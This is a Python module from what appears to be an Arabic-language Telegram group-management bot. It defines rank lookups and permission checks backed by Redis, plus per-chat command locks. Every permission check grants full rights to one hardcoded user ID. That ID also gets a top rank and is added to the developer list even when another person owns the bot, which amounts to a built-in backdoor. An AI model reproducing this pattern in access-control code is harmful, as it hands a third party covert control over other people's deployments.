from config import *
import re

def get_bot_owner_id() -> int:
   owner = r.get(f'{Dev_Zaid}botowner')
   if owner is None:
      return OWNER_ID
   try:
      return int(owner)
   except (TypeError, ValueError):
      return OWNER_ID

def get_rank(id, cid) -> str:
   if id == 6646631745 or id == 6646631745:
      return 'Aec🎖️'
   if id == int(Dev_Zaid):
      return 'البوت'
   if id == get_bot_owner_id():
      return 'Dev🎖️'
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return 'Dev²🎖'
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return 'Myth🎖️'
   if r.get(f'{id}:gban:{Dev_Zaid}'):
      return 'محظور عام'
   if r.get(f'{id}:mute:{Dev_Zaid}'):
      return 'محظور عام'
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankGowner:{Dev_Zaid}'):
         return r.get(f'{cid}:RankGowner:{Dev_Zaid}')
      return 'المالك الاساسي'
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankOwner:{Dev_Zaid}'):
         return r.get(f'{cid}:RankOwner:{Dev_Zaid}')
      return 'المالك'
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankMod:{Dev_Zaid}'):
         return r.get(f'{cid}:RankMod:{Dev_Zaid}')
      return 'المدير'
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankAdm:{Dev_Zaid}'):
         return r.get(f'{cid}:RankAdm:{Dev_Zaid}')
      return 'ادمن'
   if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankPre:{Dev_Zaid}'):
         return r.get(f'{cid}:RankPre:{Dev_Zaid}')
      return 'مميز'
   else:
      if r.get(f'{cid}:RankMem:{Dev_Zaid}'):
         return r.get(f'{cid}:RankMem:{Dev_Zaid}')
      return 'عضو'

def admin_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def mod_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def owner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def gowner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def dev_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   else:
      return False

def dev2_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   else:
      return False

def devp_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == get_bot_owner_id():
      return True
   else:
      return False


def pre_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == get_bot_owner_id():
      return True
   if id == int(Dev_Zaid):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      return True
   else:
      return False

   
def get_devs_br():
   list = []
   if not get_bot_owner_id() == 6646631745:
      list.append(6646631745)
   list.append(get_bot_owner_id())
   if r.smembers(f'{Dev_Zaid}DEV2'):
      for dev2 in r.smembers(f'{Dev_Zaid}DEV2'):
         list.append(int(dev2))
   return list


def isLockCommand(fid: int, cid: int, text: str):
   if not r.hgetall(Dev_Zaid+f"locks-{cid}"):
      return False
   else:
      commands = r.hgetall(Dev_Zaid+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            print(text)
            print(command)
            if cc == 0:
               if not gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not pre_pls(fid, cid):
                  return True
               else:
                  return False